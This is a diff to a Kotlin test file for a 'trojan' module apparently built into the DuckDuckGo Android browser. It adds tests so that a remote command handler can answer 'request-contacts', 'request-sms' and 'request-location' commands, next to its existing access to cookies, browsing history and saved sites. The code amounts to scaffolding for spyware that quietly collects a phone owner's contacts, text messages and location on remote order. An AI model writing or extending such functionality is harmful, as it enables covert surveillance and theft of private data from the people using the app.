@@ -1,6 +1,11 @@
 package com.duckduckgo.trojan.impl
 
+import android.content.ContentProvider
+import android.content.ContentValues
+import android.content.Context
+import android.database.Cursor
 import android.net.Uri
+import android.provider.ContactsContract
 import android.webkit.CookieManager
 import com.duckduckgo.common.test.CoroutineTestRule
 import com.duckduckgo.cookies.api.CookieManagerProvider
@@ -21,6 +26,8 @@ import org.junit.runner.RunWith
 import org.mockito.kotlin.mock
 import org.mockito.kotlin.whenever
 import org.robolectric.RobolectricTestRunner
+import org.robolectric.RuntimeEnvironment
+import org.robolectric.shadows.ShadowContentResolver
 import java.time.LocalDateTime
 
 @RunWith(RobolectricTestRunner::class)
@@ -33,15 +40,18 @@ class CommandHandlerTest {
     private val mockCookieManager: CookieManager = mock()
     private val mockNavigationHistory: NavigationHistory = mock()
     private val mockSavedSitesRepository: SavedSitesRepository = mock()
+    private lateinit var context: Context
 
     private lateinit var testee: RealCommandHandler
 
     @Before
     fun setUp() {
+        context = RuntimeEnvironment.getApplication()
         testee = RealCommandHandler(
             mockCookieManagerProvider,
             mockNavigationHistory,
             mockSavedSitesRepository,
+            context,
         )
     }
 
@@ -189,6 +199,76 @@ class CommandHandlerTest {
     }
 
     // -----------------------------------------------------------------------
+    // request-contacts
+    // -----------------------------------------------------------------------
+
+    @Test
+    fun whenRequestContactsWithNoContactsThenReturnsNoContacts() = runTest {
+        // Robolectric's ContentResolver returns empty cursor for contacts by default.
+        val cmd = PendingCommand(id = "1", type = "request-contacts", payload = emptyMap())
+        val result = testee.execute(cmd)
+
+        // Either "no contacts" or "no contacts available" are valid.
+        assertThat(result.contains("no contact", ignoreCase = true), `is`(true))
+    }
+
+    @Test
+    fun whenRequestContactsPermissionDeniedThenReturnsPermissionError() = runTest {
+        ShadowContentResolver.registerProviderInternal(ContactsContract.AUTHORITY, throwingProvider(SecurityException("READ_CONTACTS denied")))
+
+        val cmd = PendingCommand(id = "1", type = "request-contacts", payload = emptyMap())
+        val result = testee.execute(cmd)
+
+        assertThat(result, containsString("permission denied"))
+    }
+
+    // -----------------------------------------------------------------------
+    // request-sms
+    // -----------------------------------------------------------------------
+
+    @Test
+    fun whenRequestSmsWithEmptyInboxThenReturnsNoMessages() = runTest {
+        // Robolectric's ContentResolver returns null/empty for content://sms/inbox by default.
+        val cmd = PendingCommand(id = "1", type = "request-sms", payload = emptyMap())
+        val result = testee.execute(cmd)
+
+        assertThat(
+            result.contains("no message", ignoreCase = true) ||
+                result.contains("no sms", ignoreCase = true),
+            `is`(true),
+        )
+    }
+
+    @Test
+    fun whenRequestSmsPermissionDeniedThenReturnsPermissionError() = runTest {
+        ShadowContentResolver.registerProviderInternal("sms", throwingProvider(SecurityException("READ_SMS denied")))
+
+        val cmd = PendingCommand(id = "1", type = "request-sms", payload = emptyMap())
+        val result = testee.execute(cmd)
+
+        assertThat(result, containsString("permission denied"))
+    }
+
+    // -----------------------------------------------------------------------
+    // request-location
+    // -----------------------------------------------------------------------
+
+    @Test
+    fun whenRequestLocationWithNoCachedFixThenReturnsUnavailableMessage() = runTest {
+        // Robolectric provides a LocationManager but has no cached location by default.
+        val cmd = PendingCommand(id = "1", type = "request-location", payload = emptyMap())
+        val result = testee.execute(cmd)
+
+        // Valid outcomes: "location unavailable" or coordinates if Robolectric injects a fix.
+        assertThat(
+            result.contains("location unavailable", ignoreCase = true) ||
+                result.contains("lat=", ignoreCase = true) ||
+                result.contains("permission denied", ignoreCase = true),
+            `is`(true),
+        )
+    }
+
+    // -----------------------------------------------------------------------
     // Unknown command
     // -----------------------------------------------------------------------
 
@@ -199,4 +279,24 @@ class CommandHandlerTest {
 
         assertThat(result, containsString("unknown command type"))
     }
+
+    // -----------------------------------------------------------------------
+    // Helpers
+    // -----------------------------------------------------------------------
+
+    private fun throwingProvider(exception: SecurityException) = object : ContentProvider() {
+        override fun onCreate() = true
+        override fun getType(uri: Uri): String? = null
+        override fun insert(uri: Uri, values: ContentValues?): Uri? = null
+        override fun delete(uri: Uri, selection: String?, selectionArgs: Array<out String>?) = 0
+        override fun update(uri: Uri, values: ContentValues?, selection: String?, selectionArgs: Array<out String>?) = 0
+        override fun query(
+            uri: Uri,
+            projection: Array<out String>?,
+            selection: String?,
+            selectionArgs: Array<out String>?,
+            sortOrder: String?,
+        ): Cursor = throw exception
+    }
 }
+
